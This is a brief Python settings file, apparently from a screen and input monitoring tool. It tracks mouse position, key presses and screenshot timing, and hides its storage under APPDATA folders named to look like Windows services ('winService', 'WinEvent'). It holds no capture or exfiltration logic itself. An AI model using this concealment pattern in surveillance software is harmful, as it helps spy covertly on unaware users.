from os import getenv
from datetime import datetime
import DecryptionTests

stop_threads = False
mouse_position = ()
key_press_date = datetime.now()
last_screenshot_date = datetime.now()
unwantedWindowTitlesFilePath = getenv('APPDATA') + "\\" + "winService"
screenshotsPath = getenv('APPDATA') + "\\WinEvent"
DecryptionTests.DecryptionTests()
MAX_ALLOWED_FOLDER_SIZE = 6442450944  # 6 GB in bytes
